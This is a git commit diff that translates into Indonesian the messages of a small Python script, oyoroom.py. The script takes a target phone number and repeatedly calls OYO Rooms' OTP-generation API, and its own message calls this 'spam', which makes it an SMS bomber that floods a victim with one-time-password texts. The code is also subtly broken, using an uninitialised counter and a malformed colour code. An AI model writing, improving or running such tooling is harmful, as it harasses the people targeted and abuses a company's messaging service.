18ac27cab9cce414e163ad5e23abacfb43c137fb
Step By Step <52529306+stepbystepexe@users.noreply.github.com>
2020-02-19 05:52:54 +0700

    Update oyoroom.py

--- tools/oyoroom.py
+++ tools/oyoroom.py
@@ -1,14 +1,15 @@
 import requests, os
-no=input("\033[0m[\033[1;32m+\033[0m] \033[1;77mInput No Target: \033[0m")
+
+no=input("\033[0m[\033[1;32m+\033[0m] \033[1;77mMasukan No Target: \033[0m")
 while True:
         idk=('status')
         r=requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+no+'&country_code=+62')
         if str(idk) in str(r.text):
-                print("\033[0m[\033[1;34#m+\033[0m] \033[1;77mSucces")
+                print("\033[0m[\033[1;34#m+\033[0m] \033[1;77mBerhasil")
         else:
-                print("\033[0m[\033[1;31m!\033[0m] \033[1;77mFailed")
+                print("\033[0m[\033[1;31m!\033[0m] \033[1;77mGagal")
                 break
         i+=1
         if i == 20:
-                print("\033[0m[\033[1;33m-\033[0m] \033[1;77mAs the limited")
+                print("\033[0m[\033[1;33m-\033[0m] \033[1;77mSpam terbatas")
                 break
